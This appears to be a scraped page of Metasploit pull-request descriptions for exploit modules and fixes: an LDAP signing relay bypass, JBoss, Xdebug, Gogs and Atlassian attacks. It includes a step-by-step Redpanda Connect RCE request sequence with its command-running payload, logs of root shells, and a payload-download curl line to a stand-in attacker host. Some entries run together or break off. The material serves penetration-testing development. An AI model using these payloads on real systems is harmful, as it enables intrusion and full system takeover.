1b:T11f6,## Description

If LDAP signing is enabled, LDAP traffic after authentication is protected using the negotiated security context. This defeats MITM attacks because if you don't have the session key you're SOL - until now! 

This module exploits CVE-2026-70229 to relay SMB NTLM authentication to LDAP on affected domain controllers, even when LDAP signing is required. It targets LDAP over TCP/389 (LDAPS on 636 is not affected). 

The attacker first establishes an NTLM SASL security context with a known session key, using credentials they control or, where supported, anonymous NTLM SASL authentication. They then relay the victim’s SMB NTLM exchange over that existing connection. The final LDAP BindRequest carrying the victim’s NTLM AUTHENTICATE message and a prepared LDAP ModifyRequest (RBCD or shadow creds attack) are placed together in one SASL record, signed and sealed using the bootstrap security context.

The vulnerable DC verifies the record using the bootstrap context, completes authentication as the victim, and executes the following modification with the victim’s permissions. Subsequent requests would require the victim’s session key, which the attacker does not know. The module therefore includes its RBCD or shadow credentials modification in the same record as the final bind. A session cannot be established, it's a "if you had one shot, one opportunity, to update a LDAP record as the account whose authentication you're relaying, when LDAP signing is required, would you stack that ModifyRequest, or just let it slip?" type of thing. 

## Setup and Reproduction (if applicable)

SkyFrost is setup and ready to be tested. LDAP signing as well as anonymous binds are enabled. DM for details. 

## Verification

## Verification Steps
1. Start Metasploit Framework.
1. Run `use auxiliary/server/relay/smb_to_ldap_signing_bypass`.
1. Configure `RHOSTS` with the DC address and `TARGET_ACCOUNT` with an explicit sAMAccountName or DN.
1. For RBCD, configure `DELEGATE_FROM` with the controlled account or its SID.
1. For shadow credentials with anonymous bootstrap, supply the full target DN in `TARGET_ACCOUNT`. No delegate account or SID is needed.
1. If anonymous NTLM SASL is unsupported, set `BOOTSTRAP_AUTH NTLM` and set `LDAPDomain`, `LDAPUsername`, and LDAPPassword`.
1. Run the module and separately cause the authorized SMB client to authenticate to the module's listener.
1. Confirm the exact ACE or device ID with a fresh LDAP connection.

```1c:Tbf3,## Description

The HTTPS branch of the curl fetch command hardcoded `-k` (`--insecure`), so
TLS certificate verification was always disabled for curl. As a result the
`FETCH_CHECK_CERT` datastore option had no effect when `FETCH_COMMAND` is
`CURL`, even though:

- `CURL` is the default `FETCH_COMMAND` for the `cmd/linux/https/*` payloads,
  which register `FETCH_CHECK_CERT` through the HTTPS server mixin, and
- the `GET` and `TNFTP` commands already honor `FETCH_CHECK_CERT`.

So an operator who set `FETCH_CHECK_CERT true` still got an insecure,
unverified download with the default curl command.

The fix only adds `-k` when `FETCH_CHECK_CERT` is false. When it is true, curl
now performs normal certificate verification. The HTTP and TFTP curl branches
are unchanged.

**Related Issue:** None (defect found by code inspection of the fetch adapter).

## Breaking Changes

None by default. `FETCH_CHECK_CERT` defaults to `false`, and in that case the
generated command is byte-for-byte identical to before (`curl -sko ...`). The
behavior only changes for operators who explicitly set `FETCH_CHECK_CERT true`,
who previously got a silently insecure download and now get a verified one.

## Reviewer Notes

- The change is confined to the HTTPS branch of `_generate_curl_command`.
- This makes curl consistent with the existing `GET` and `TNFTP` handling of
  `FETCH_CHECK_CERT`; `wget` still hardcodes `--no-check-certificate` and can
  be addressed as a separate, focused follow-up if desired.
- `lib/msf/core/payload/adapter/fetch.rb` has pre-existing, unrelated RuboCop
  offenses that are left untouched to keep this a focused bug fix.

## Verification Steps

- [x] Behavior check on the patched method (no DB required): with
  `FETCH_CHECK_CERT` false the command is `curl -sko <dest> https://<uri>`;
  with it true the command is `curl -so <dest> https://<uri>` (no `-k`).
- [x] Run the fetch adapter spec, which includes the two new regression
  examples:

  ```
  bundle exec rspec spec/lib/msf/core/payload/adapter/fetch_spec.rb
  ```

## Test Evidence

```
# FETCH_CHECK_CERT=false => curl -sko /tmp/payload https://attacker.example:8080/u
# FETCH_CHECK_CERT=true  => curl -so  /tmp/payload https://attacker.example:8080/u
PASS: default still skips cert verification (-sko), unchanged from before
PASS: FETCH_CHECK_CERT=true verifies the certificate (no -k)
```

Two regression specs were added covering both states; the full suite runs in
CI.

1d:Tc80,## Description

`Rex::Proto::DNS::UpstreamRule#initialize` built an `ArgumentError` for an
invalid wildcard but never raised it: the `raise` keyword was missing, so the
exception object was instantiated and immediately discarded. An invalid
wildcard was therefore silently accepted and stored in `@wildcard`, producing
a rule that can never match correctly in `#matches_name?`.

The intent is unambiguous: the sibling resolver guard in the same constructor
does `raise ::ArgumentError.new(...)` for an invalid resolver, the
`valid_wildcard?` class method exists precisely to gate this, and
`CustomNameserverProvider#add_upstream_rule` constructs an `UpstreamRule`
without pre-validating the wildcard, relying on the constructor to reject bad
input. This path simply forgot the `raise`.

This adds the missing `raise` (using the exploded `raise Class, message` form)
so an invalid wildcard is rejected the same way an invalid resolver already
is. The other caller that pre-validates with `valid_wildcard?` before
constructing is unaffected.

**Related Issue:** None (defect found by code inspection).

## Breaking Changes

None in practice. The only behavior change is that an invalid wildcard passed
to the constructor now raises `ArgumentError` instead of being silently stored
as a broken rule. No caller depends on the previous silent-acceptance
behavior.

## Reviewer Notes

- The change is confined to the wildcard guard in `#initialize` (plus the
  blank line RuboCop requires after a guard clause).
- `lib/rex/proto/dns/upstream_rule.rb` has a few pre-existing, unrelated
  RuboCop offenses that are left untouched to keep this a focused one-line bug
  fix rather than a style sweep.

## Verification Steps

1. - [x] Direct behaviour check (loads the class, no DB needed):
     ```
     ruby -Ilib -e 'require "rex/socket"; require "rex/proto/dns/upstream_rule"; \
       UR = Rex::Proto::DNS::UpstreamRule; \
       begin; UR.new(wildcard: "not a valid wildcard"); puts "no raise"; \
       rescue ArgumentError; puts "raised"; end'
     ```
     Before the fix prints `no raise`; after the fix prints `raised`.
2. - [x] `bundle exec rspec spec/lib/rex/proto/dns/upstream_rule_spec.rb`
     exercises the two new `#initialize` examples (raises on an invalid
     wildcard, does not raise on a valid one).

## Test Evidence

```
# direct behaviour check on the patched tree
PASS: invalid wildcard raised ArgumentError
PASS: valid wildcard did not raise

# rubocop on the changed lines
(no offenses on the changed lines; remaining offenses in the file are pre-existing and unrelated)
```

1e:Tf1a,## Description

Modernizes three JBoss deployer exploit modules that relied on the deprecated `HttpFingerprint` constant and had no `check` method:

- `exploits/multi/http/jboss_bshdeployer`
- `exploits/multi/http/jboss_deploymentfilerepository`
- `exploits/multi/http/jboss_maindeployer`

Each module now:

- Drops the `HttpFingerprint` constant.
- Implements a real `check` that requests the JMX console and returns `Appears` / `Detected` / `Safe` / `Unknown` from the HTTP response, giving users version-aware verification instead of a passive banner match.
- Prepends `Msf::Exploit::Remote::AutoCheck`, so the check runs automatically before exploitation.

The console path is requested with a trailing slash because JBoss `302`-redirects the path without one. An authenticated console (`401`/`403`) is reported as `Detected` rather than `Safe`, because that is precisely the condition the `VERB` auth bypass (CVE-2010-0738) targets — `AutoCheck` warns and proceeds on `Detected`, so the exploit path is preserved.

Scope is kept to a single modernization pattern: replacing `HttpFingerprint` with a proper `check`, plus the `AutoCheck` that a new `check` requires. Pre-existing unrelated offenses in these files (metadata note sentinels, `and`/`or` style, duplicate `RPORT`) are intentionally left untouched.

Closes: N/A — modernization per CONTRIBUTING.md "Modernizing Existing Modules".

AI tools used: Claude Code (assisted with the pattern scan across the module tree, check implementation, and RuboCop/msftidy validation).

## Setup and Reproduction

1. Deploy a vulnerable JBoss AS instance whose JMX console sits behind auth (HTTP 401):
   ```
   docker run -d --name jboss -p 8080:8080 vulhub/jboss:as-4.0.5
   ```
2. Confirm the console redirects/authenticates: `curl -sI http://127.0.0.1:8080/jmx-console/` returns `401`.
3. `git` and a reachable `LHOST` from the target are required for the payload callback.

## Verification

1. Run `use exploit/multi/http/jboss_bshdeployer`, set `RHOSTS`, and run `check`; confirm it returns a version-aware result rather than a banner match.
2. Set `VERB HEAD` and a payload, run the exploit, and confirm `AutoCheck` proceeds on the `Detected` result and a session opens via the auth bypass.

## Results and evidence

Environment: `vulhub/jboss:as-4.0.5` (JMX console behind auth, HTTP 401), `java/meterpreter/reverse_tcp`.

Check output:

```
msf6 exploit(multi/http/jboss_bshdeployer) > check
[*] 127.0.0.1:8080 - The service is running, but could not be validated. The JMX console requires authentication (HTTP 401); the HEAD verb may bypass it (CVE-2010-0738).
```

Exploit output (`VERB=HEAD`):

```
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The service is running, but could not be validated. The JMX console requires authentication (HTTP 401); the HEAD verb may bypass it (CVE-2010-0738).
[*] Calling stager /jeImusKaCOO/ZJXDqkbqtRyxnbc.jsp to deploy final payload
[*] Calling JSP file with final payload...
[*] Meterpreter session 1 opened (... -> ...)
Computer        : e9d8d94d9e75
OS              : Linux
Architecture    : x64
Server username: root
```

Verified:

- `check` returns a version-aware result on JBoss AS 4.0.5 (`Detected` on the authenticated console).
- `AutoCheck` runs the check, warns on `Detected`, and proceeds — exploit path unchanged.
- Full chain via the `VERB` auth bypass: check → deploy WAR → call JSP → root Meterpreter session.
- `msftidy.rb` passes; the `ModuleMissingAutocheck` RuboCop offense introduced by adding `check` is resolved (remaining offenses are pre-existing and unrelated).

Untested:

- JBoss versions other than AS 4.0.5.
- `jboss_maindeployer` / `jboss_deploymentfilerepository` full exploit chain (check verified against the same live target; `jboss_bshdeployer` exercised end-to-end).
- Windows / non-Java targets.
1f:Tadb,Fixes #22119

## Description

`servicePrincipalName` is multivalued with no guaranteed order, but `run_ldap` only looked at the first value. Since #22074, a malformed first SPN is warned about and skipped, which still skips the whole account even when a later SPN is valid.

`run_ldap` now selects the first SPN that passes the existing format check, moved into a small `valid_spn?` helper (same `split('/').length == 2` test as before). The account is skipped with the existing warning only when none of its SPNs pass, and enumeration continues. Accounts whose first SPN is valid behave exactly as before.

Not changed: the single-user path (`user_object[:serviceprqincipalname].first`) has the same first-value assumption but is outside the scope of #22119. Happy to follow up if wanted.

AI tools: Claude was used to help write the change and the spec. I reviewed and tested both.

## Setup and Reproduction (if applicable)

Needs an AD account with more than one SPN where the first returned value is malformed, for example `ServerName/server.domain.local/domain.local` (the shape from #22074) alongside a valid one like `MSSQLSvc/db01.domain.local`. Because the order of SPN values isn't guaranteed, the malformed value has to come first for the bug to show.

## Verification

- [x] Run `bundle exec rspec spec/modules/auxiliary/gather/kerberoast_spec.rb` and confirm 0 failures.
- [x] Run the same spec against master's `kerberoast.rb` and confirm the "malformed first SPN, valid later SPN" case fails.
- [x] `bundle exec rubocop` on the module and spec, and `tools/dev/msftidy.rb` on the module: no offenses.
- [ ] Run `auxiliary/gather/kerberoast` against a domain with an account whose first SPN is malformed and a later one is valid, and confirm a hash is returned for that account: not run (no AD environment available locally).

### Results and evidence

New `spec/modules/auxiliary/gather/kerberoast_spec.rb` stubs the LDAP layer and `roast` and asserts which SPN reaches `roast`. Cases covered:

- malformed first SPN with a valid later one: ticket requested with the valid SPN, no warning
- no valid SPNs: warning printed, account skipped, the next account is still processed
- valid first SPN: first SPN used, as before

Against master's `kerberoast.rb`:

```
10 examples, 1 failure
rspec ./spec/modules/auxiliary/gather/kerberoast_spec.rb:45 # Kerberoast SPN selection #run_ldap when the first SPN is malformed and a later SPN is valid requests a ticket using the valid SPN
```

With this change:

```
10 examples, 0 failures
```

(The 10 examples are the 3 new ones plus 7 acceptance examples that run alongside.)

Not tested: an end-to-end run against a real domain controller. The spec exercises the SPN selection logic, not the LDAP query or the TGS request.20:Ta92,## Description

`AutoLoadExtensions` were de-duplicated with a case-sensitive `uniq` in
`Msf::Sessions::Meterpreter#bootstrap`, so an operator-supplied extension name
in a different case (e.g. `Stdapi`) survived alongside the auto-added default
(`stdapi`). The `load` command lowercases the extension name internally
(`cmd_load`: `md = m.downcase`), so both resolve to the same extension and it
was loaded twice.

This extracts the extension-list building out of `bootstrap` into
`auto_load_extensions` and folds duplicates with `uniq(&:downcase)`, so each
extension is loaded once regardless of the spelling supplied. Keeping the
original spelling is safe because `load` downcases it anyway.

**Related Issue:** Follows up on the review discussion in #21986 (the
`OptArray` reorder there fixes a real coding error but cannot affect
`AutoLoadExtensions`, which is registered without `accepted`, so casefolding
never runs; the actual double-load is this case-sensitive `uniq`).

## Breaking Changes

None. Only genuine duplicates are removed; a single `load` per extension was
always the intent, and `load` already lowercased names, so no previously
loadable extension stops loading.

## Reviewer Notes

- The extraction is purely to make the de-duplication unit-testable;
  `bootstrap` is otherwise hard to exercise in isolation.
- cc @bwatters-r7 - this is the load-site fix we discussed on #21986.

## Verification Steps

1. - [x] Run the session spec:
     `bundle exec rspec spec/lib/msf/base/sessions/meterpreter_spec.rb`
     - expect `18 examples, 0 failures` (three new `#auto_load_extensions`
     examples: parsing/trimming, case-variant de-duplication, and the
     auto-added default colliding with a differently cased supplied name).

## Test Evidence

```
$ bundle exec rspec spec/lib/msf/base/sessions/meterpreter_spec.rb
18 examples, 0 failures

#auto_load_extensions
  parses a comma-separated string and trims blanks
  de-duplicates case-variant spellings of the same extension
  does not load an auto-added extension twice when supplied in a different case
```

21:Tcb5,## Description

`exploit/unix/http/xdebug_unauth_exec` never creates a session as shipped. Two bugs in `exploit`:

1. **Undefined `srvhost`.** The module includes only `Msf::Exploit::Remote::Tcp` and `Msf::Exploit::Remote::HttpClient`, neither of which defines a `srvhost` helper (that lives in the `SocketServer`/`HttpServer` mixins). So `'LocalHost' => srvhost` raises `NameError`. Because the call sits inside the callback `Thread` whose `ensure` swallows exceptions, it fails silently — the listener is never created, Xdebug's debug-session connect-back hits a closed port, and the kernel RSTs it. The module always reports "Exploit completed, but no session was created."

2. **Listener bind race.** Even with `srvhost` fixed, `Rex::Socket::TcpServer.create` ran *inside* the thread while the main thread immediately fired the trigger HTTP request. The Xdebug callback can arrive before the thread reaches `accept()`, getting RST again.

Fix: create the listener in the main thread (`TcpServer.create` binds and listens synchronously) using `datastore['SRVHOST']`, before sending the trigger request, so the port is accepting connections before Xdebug connects back. Single-file change.

AI assistance: Claude Code helped diagnose the bug and draft the patch; I reviewed it and verified the fix against a live Xdebug 2.5.5 target.

## Setup and Reproduction

Any host running Xdebug <= 2.5.5 with `xdebug.remote_enable=1` and `xdebug.remote_connect_back=1`. HTB "Olympus" exposes exactly this (Xdebug 2.5.5, Apache, PHP 7.1).

On the stock module:

```
use exploit/unix/http/xdebug_unauth_exec
set RHOSTS <target>
set PATH /index.php
set LHOST <attacker>
set SRVHOST <attacker>
run
```

Result: "Exploit completed, but no session was created." A `tcpdump` of SRVPORT (9000) shows the target's SYN answered with an RST from the attacker host (listener never bound).

## Verification

- [x] Start `msfconsole`
- [x] `use exploit/unix/http/xdebug_unauth_exec`
- [x] Set `RHOSTS`, `PATH`, `LHOST`, `SRVHOST`
- [x] `run`
- [x] Confirm the SRVPORT callback is accepted and the DBGp handshake + `eval` complete (before the fix: no session, RST on SRVPORT)

## Results and evidence

Tested against a live Xdebug 2.5.5 / PHP 7.1 target.

**Before (stock module):** target connects back to SRVPORT, the attacker host RSTs it, no session.

**After (this change):** the SRVPORT callback is accepted, the DBGp `<init>` handshake completes, the `eval` command is delivered, and the payload executes and connects back to LPORT. `tcpdump` of SRVPORT after the fix:

```
<target>.52030 > <attacker>.9000: Flags [S]      # Xdebug connects back
<attacker>.9000 > <target>.52030: Flags [S.]     # accepted (was RST before the fix)
<target>.52030 > <attacker>.9000: 493 bytes      # DBGp <init>
<attacker>.9000 > <target>.52030: 2027 bytes     # eval command delivered
```

A payload connect-back to LPORT was observed immediately afterward, confirming code execution on the target.

Note: the module's default `php/meterpreter/reverse_tcp` stager can drop quickly on some targets because its lifetime is bound to the PHP request that spawned it; that is independent of this change. The default is left untouched to keep this PR scoped to the never-working listener.
22:Tb1d,Fixes #21801

## Description

Launch-time validation (`OptionContainer#validate`, used by RPC, `exploit -j` and msfvenom) enforces `required: true` without consulting an option's `conditions:`, while the console's `Msf::OptCondition.show_option` does. As reported in #21801, this means `FETCH_WRITABLE_DIR` (`required: true`, `conditions: ['FETCH_FILELESS', '==', 'none']`) could fail a non-interactive launch even though it is unused once `FETCH_FILELESS` is not `none`, which made the fileless TFTP path unreachable through the normal set/launch flow.

This PR is the **option-level fix** only: `FETCH_WRITABLE_DIR` is now `required: false` in `lib/msf/core/payload/adapter/fetch/linux_options.rb`. The underlying validator gap (any option combining `required: true` with `conditions:`) is not addressed here and will be tracked separately.

Deliberately unchanged:

- `windows_options.rb`'s `FETCH_WRITABLE_DIR` stays `required: true`; Windows targets don't expose `FETCH_FILELESS`, so it is always applicable there.
- `FETCH_FILENAME` is already `required: false`. `FETCH_PIPE` is `required: true` but defaults to `false` (non-blank when stringified), so its required-check never fires.
- No downstream enforcement changes: `_generate_tftp_command` and `_remote_destination_nix` already no-op `FETCH_WRITABLE_DIR`/`FETCH_FILENAME` based on `FETCH_FILELESS` (post-#21548), and every `FETCH_COMMAND` path goes through `_remote_destination_nix`.

Behavior note: with `FETCH_FILELESS == none`, a blank `FETCH_WRITABLE_DIR` is no longer rejected at launch. It falls back to `.` via `_remote_destination_nix`, which matches the option's existing `./` default.

AI tools: None.

## Test

New `spec/lib/msf/core/payload/adapter/fetch/linux_options_spec.rb` builds an option container from the real `LinuxOptions` mixin and asserts `FETCH_WRITABLE_DIR` is not statically required. It fails on master (`expected false`) and passes with this change. It pins the option definition; it does not reproduce the launch failure end to end.

## Verification

- [x] `bundle exec rspec spec/lib/msf/core/payload/adapter/fetch/linux_options_spec.rb spec/lib/msf/core/option_container_spec.rb`: 0 failures. The new spec fails on master and passes with the fix.
- [x] `bundle exec rspec spec/lib/msf/core/payload/adapter/fetch_spec.rb`: 20 examples, 2 failures (`_generate_curl_command` / `_generate_wget_command` arch/endian execution tests). The same 2 failures reproduce on unmodified master, so they are pre-existing and unrelated.
- [ ] Manual launch with `FETCH_COMMAND=TFTP` and `FETCH_FILELESS=shell-search` via `exploit -j`: not yet run.
- [ ] Behavior with `FETCH_FILELESS == none` and a blank `FETCH_WRITABLE_DIR` (falls back to `.`): not yet run.

24:T1dd2,### Summary

This adds a new remote exploit module for an unauthenticated remote code execution vulnerability in Redpanda Connect (formerly Benthos) when it is started in streams mode (`redpanda-connect streams`).

In the affected versions the streams management HTTP API binds to `0.0.0.0:4195` with authentication disabled by default. An unauthenticated attacker can register an arbitrary stream configuration with `POST /streams/{id}`. If that stream's pipeline uses the `command` processor, it runs an attacker-controlled OS command. By pairing an `http_server` input with a `sync_response` output, the attacker triggers the command over the same management port and the command's stdout is returned in-band in the body of the triggering request, which makes both a reliable `check` and a session-capable `exploit` straightforward.

The module registers such a stream, triggers it, and deletes it afterwards. The stream id and the trigger path are randomized per run.

Affected by default: versions 4.39 through 4.110, where the management API is on by default. From 4.111 the API is opt-in (`--bind-http`), so default installs of 4.111+ are not affected.

### Vulnerability details

CVE: CVE-2026-123270 (published 2026-11-09, coordinated through CERT/CC).
Reference: https://www.cve.org/CVERecord?id=CVE-2026-123270

Request sequence used by the module:

1. Reachability (check): `GET /streams` returns `200` when the API is reachable unauthenticated (`401`/`403` when auth is enabled or it is not in streams mode).
2. Create stream: `POST /streams/{id}` with `Content-Type: application/x-yaml` and a JSON body (JSON is valid YAML, which sidesteps YAML and Bloblang quoting issues):

   ```json
   {"input":{"http_server":{"path":"/<rand>"}},
    "pipeline":{"processors":[{"command":{"name":"sh","args_mapping":"root = [\"-c\",\"<CMD>\"]"}}]},
    "output":{"sync_response":{}}}
   ```

3. Trigger and read output: `POST /{id}/<rand>` with a small body runs the command and returns its stdout in the HTTP response body.
4. Cleanup: `DELETE /streams/{id}`.

### Module details

- Type: exploit (`Msf::Exploit::Remote` with `Msf::Exploit::Remote::HttpClient`).
- Rank: `ExcellentRanking`.
- `AutoCheck` is prepended, so `check` runs automatically before exploitation.
- Target: `Unix Command` (`Platform => unix`, `Arch => ARCH_CMD`); delivers any `cmd/unix/*` payload.
- Default RPORT: 4195.
- Options: `RHOSTS`, `RPORT` (4195), `TARGETURI` (`/`).
- Notes: `CRASH_SAFE`, `REPEATABLE_SESSION`, side effects `IOC_IN_LOGS` and `ARTIFACTS_ON_DISK`.

`check` is thorough: it confirms `GET /streams` is reachable unauthenticated and then proves actual command execution by running `echo <random marker>` and matching the marker in the in-band response. 200 with the marker returns `Vulnerable`, 200 without the marker returns `Appears`, non-200 returns `Safe`.

`exploit` delivers `payload.encoded` detached, wrapped as `( <payload> ) >/dev/null 2>&1 &`, so the `sync_response` trigger returns immediately for long-lived reverse or bind shells. The detached payload survives the stream deletion, so the session persists after cleanup.

### Verification

Verified end to end inside the `metasploitframework/metasploit-framework` Docker image (`--platform linux/amd64`) against a live vulnerable `redpanda-connect v4.109.0` started in streams mode and bound to loopback only (`http.address=127.0.0.1:4195`). Framework reported `Framework: 6.5.9-dev`.

```
msf6 > use exploit/linux/http/redpanda_connect_streams_rce
msf6 > set RHOSTS 127.0.0.1
msf6 > set RPORT 4195
msf6 > check
[+] 127.0.0.1:4195 - The target is vulnerable. Unauthenticated command execution confirmed; marker was echoed in-band.

msf6 > set PAYLOAD cmd/unix/reverse_bash
msf6 > set LHOST 127.0.0.1
msf6 > set LPORT 4444
msf6 > exploit -j
[*] Started reverse TCP handler on 127.0.0.1:4444
[*] Delivering payload via the streams management API at http://127.0.0.1:4195/
[*] Payload delivered; waiting for session (if using a reverse/bind payload).
[*] Command shell session 1 opened (127.0.0.1:4444 -> 127.0.0.1:57342)

msf6 > sessions -c id
[*] Running 'id' on shell session 1 (127.0.0.1)
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)

msf6 > sessions -c "uname -a"
Linux 933b9f6b948d 6.10.14-linuxkit #1 SMP ... x86_64 Linux
```

So `check` returns Vulnerable, `exploit -j` opens a command shell session, and the session runs as `uid=0(root)` on the target.

### Verification steps for a reviewer

1. Start a vulnerable instance: `redpanda-connect streams -s http.address=127.0.0.1:4195` using a version in the 4.39 through 4.110 range (tested with 4.109.0).
2. `use exploit/linux/http/redpanda_connect_streams_rce`
3. `set RHOSTS <target>`
4. `check` and confirm it returns Vulnerable.
5. `set PAYLOAD cmd/unix/reverse_bash`, `set LHOST <ip>`, `set LPORT <port>`
6. `run` and confirm a session opens.
7. Interact with the session and confirm command execution.

### msftidy and RuboCop status

Both linters were run inside the `metasploitframework/metasploit-framework` Docker image with the module placed at its upstream path.

RuboCop with the framework config is clean:

```
bundle exec rubocop --config .rubocop.yml modules/exploits/linux/http/redpanda_connect_streams_rce.rb
1 file inspected, no offenses detected
```

An earlier run flagged four metasploit-specific cops, all now fixed in the module:

- `Lint/ModuleRedundantArchPlatform`: removed top-level `Platform` and `Arch` (already set on the target).
- `Lint/ModuleDuplicateOption`: removed the re-registered `Opt::RPORT`; the default port is set in `DefaultOptions` instead.
- `Lint/ModuleDefaultPayload`: removed the hardcoded default `PAYLOAD`; the framework auto-selects a compatible `cmd/unix` payload.

msftidy reports no module warnings or errors. The only caveat is environmental: the Docker image ships `/usr/src/metasploit-framework` without a `.git` directory, so msftidy's git-based gate that decides which modules require RuboCop (`new_modules_for`, which shells out to `git diff`) raises a pre-existing `NameError` on the line `if !status.success? && exception`. This is unrelated to the module and does not happen in a real framework checkout. With that gate satisfied, msftidy runs its full check suite plus RuboCop on the module and reports `1 file inspected, no offenses detected`. In a normal `git`-backed checkout (where upstream reviewers and CI run it) msftidy runs cleanly with no changes needed.

### Upstream path choice

Placed at `modules/exploits/linux/http/redpanda_connect_streams_rce.rb`.

Rationale: `exploit/multi/http` was considered because the payload target is a generic Unix command, and Redpanda Connect ships for multiple operating systems. In practice Redpanda Connect is deployed almost exclusively on Linux servers (containers and Linux hosts), and the verified target is Linux, so `linux/http` matches how operators will look for it and is consistent with similar HTTP command-execution modules. If the maintainers prefer `multi/http`, the module is OS-agnostic (`Platform => unix`, `Arch => ARCH_CMD`) and can be moved with no code change.

### Open items and remaining blockers

- No functional blocker to merge. The module is linter-clean and verified end to end with a root session.
- Testing so far covers `v4.109.0`. A version at each end of the affected range (4.39 and 4.110) would strengthen the PR but is not required.
- Author credit: discovery and module are both credited to Adrian Pastor (github.com/pagvac). Adjust if a separate module author line is desired.
25:Tc59,## Description

This PR addresses the remaining `login.rb` return structure item in #17606. The login code returned arrays whose contents changed depending on the result. Dashboard success returned `[0, [body, auth_cookies]]`, while an unsigned license returned `[5, [auth_cookies, nsp]]`. In #17606, the maintainer suggested using hashes instead of arrays to avoid depending on position and noted that the callers would need to be updated too. This changes those results to hashes with named fields and updates the Nagios XI scanner and SNMPTrap module that interact with them. `authenticate` retains its current return format to avoid breaking the exploit modules that use it currently.

## Description

Adds a new exploit module for CVE-2025-8110, an authenticated Remote Code Execution vulnerability in
Gogs ≤ 0.13.x.

The vulnerability exists in the content API (PUT /api/v1/repos/:owner/:repo/contents/:path): when the target path resolves to a symbolic link, Gogs writes the new content directly to the symlink's target without validating it. An authenticated attacker can:

1. Push a symlink pointing to .git/config of an arbitrary repository.
2. Overwrite the config via the API to inject a malicious core.sshCommand.
3. Trigger execution by initiating an SSH-based Git clone, causing the server to execute the injected command.

Module rank: Excellent. Requires a valid Gogs account and an API token. The git binary must be present on the attacker machine.

Closes: N/A — original PoC: https://github.com/Ghxstsec/CVE-2025-8110

AI tools used: Claude Code (assisted with RuboCop autocorrection and documentation formatting per msftidy requirements).

## Setup and Reproduction (if applicable)

1. Deploy a vulnerable Gogs instance (≤ 0.13.x):
docker run -d --name gogs -p 3000:3000 gogs/gogs
2. Access http://localhost:3000, complete the setup wizard, and create a user account.
3. Generate an API token at Settings → Applications → Generate new token.
4. Ensure git is installed on the attacker machine.

Full setup instructions are documented in documentation/modules/exploit/multi/http/gogs_git_symlink_rce.md.

## Verification

- [x] Run use exploit/multi/http/gogs_git_symlink_rce, set all required options, and confirm a shell session opens on the target Gogs server.
- [x] Confirm the module cleans up after itself (no leftover /tmp/msf_* directories on the attacker machine after the session closes).

### Results and evidence

**Environment:** Gogs 0.13.0 binary on Parrot Linux, `cmd/unix/reverse_bash` payload.

**Check output:**

28:Tc48,## Description

This adds an auxiliary module for `CVE-2026-21589`, a path traversal vulnerability in web resource routes used by Atlassian Data Center products.

The default `READ_FILE` action supports Jira Software, Jira Service Management, Confluence, and Bitbucket. It confirms the vulnerability by reading a protected application file. It can then read an operator-selected file, store that file as loot, and report the affected service and vulnerability.

Jira and Confluence also support `CREATE_USER` and `MODIFY_PRIVILEGES`. These actions disclose a Crowd application credential from `crowd.properties`. The module uses that credential to create or select a Crowd user and grant access and administrator group memberships. It can create a missing administrator group, verifies completed writes, and reports disclosed or created credentials. If an action fails after making changes, `cleanup` attempts to remove the tracked memberships, user, and groups.

A new fingerprinting helper supports Jira, Confluence, and Bitbucket. It distinguishes self-hosted Jira from Jira Cloud, parses advertised versions, and classifies fixed release branches when traversal evidence is unavailable.

Codex was used to assist in the development.

This addresses https://github.com/rapid7/metasploit-framework/issues/22089.

- Bitbucket 10.2.7 supports `READ_FILE`.

Obtain disposable Atlassian evaluation licenses. Create the product administrator, Crowd administrator, and Crowd application credentials through the documented setup wizards.

For Crowd actions, map the internal directory to the application with `Read/Write` permissions. Permit the Metasploit source address and mount the documented `crowd.properties` file. Set `CROWD_URL` when Crowd uses a different origin.

2d:Te04,## Description

Make the developer reference-link checker classify the final redirect response. It currently discards the result of redirect traversal and classifies the original 3xx as alive, even when the destination is a 404 or its request failed.

Resolve relative `Location` values against the current URI and create the redirect request for its actual host, port and TLS scheme. Keep request errors from being overwritten by subsequent response classification. The existing redirect limit is unchanged.

AI assistance: OpenAI Codex assisted with analysis, implementation, regression specs and this description.

## Setup and Reproduction

Tested on Linux x86_64, Ruby 3.3.8 with the repository bundle. The specs use mocked `Net::HTTP` clients and real response objects; no external requests, database, Framework modules or target services are needed.

Before the fix:

- An initial 302 followed by a 404 is classified as `Alive`.
- An initial request error is replaced with `Error: No response received`; a redirected request error can be replaced with `Alive`.
- Cross-host redirects reuse the original connection, and relative locations cannot supply `request_uri`.

Afterward, the final 404 is `Not Alive (Status Code: 404)`, request errors retain their original message, and redirect requests use the resolved URI's connection details.

## Verification

- [x] `SPEC_HELPER_LOAD_METASPLOIT=false bundle exec rspec spec/tools/dev/detect_dead_reference_links_spec.rb --format progress` — 23 examples, 0 failures after review fixes. The original nine redirect specs have six failures before the initial fix.
- [x] `bundle exec rubocop spec/tools/dev/detect_dead_reference_links_spec.rb` — no offenses.
- [x] RuboCop on the tool — the same two existing findings as the original source, with no new findings.
- [x] `ruby -c tools/dev/detect_dead_reference_links.rb` — syntax OK.
- [x] `git diff --check` — clean.

### Results and evidence

Regression cases cover a redirect to a missing destination, successful redirects, relative paths with queries, cross-host/non-default-port requests, HTTPS-to-HTTP transitions, original and redirected request errors, successful non-redirected responses, and the existing five-redirect bound. Archive API calls and progress-file writes are stubbed. The live external-link crawl and full Framework suite were not run.

## Review follow-up

The HTTP client now uses `uri.hostname` for bracket-free IPv6 literals. Initial, redirect and Wayback connections share a conservative public-destination check: reject non-HTTP(S) URIs, private/loopback/link-local/reserved addresses, mixed public/private DNS answers, and unsupported IPv6 special ranges. Resolve once and pin `Net::HTTP#ipaddr` to the checked address while retaining the hostname for Host/TLS. Environment proxies are disabled explicitly so they cannot independently resolve or route the requested destination. This intentionally rejects internal reference URLs and no longer honors proxy environment variables for this developer crawler.

Wayback queries now strip the `URL-` metadata prefix and percent-encode the full original URL as one parameter. Added offline specs cover initial/redirect IPv6, pinned addresses, blocked destinations including IPv4-mapped IPv6, mixed DNS, invalid schemes, and query-string preservation. The same two pre-existing tool RuboCop findings remain; new specs are clean.

The earlier macOS Java 21 job failed during Bundler installation because the runner could not resolve rubygems.org; it did not reach the tests. New commits will run CI again.

2f:T131c,## Description

Stopping an asynchronous job after it claims cleanup can terminate its callback. The claim prevents another attempt, leaving resources such as listeners open after job removal.

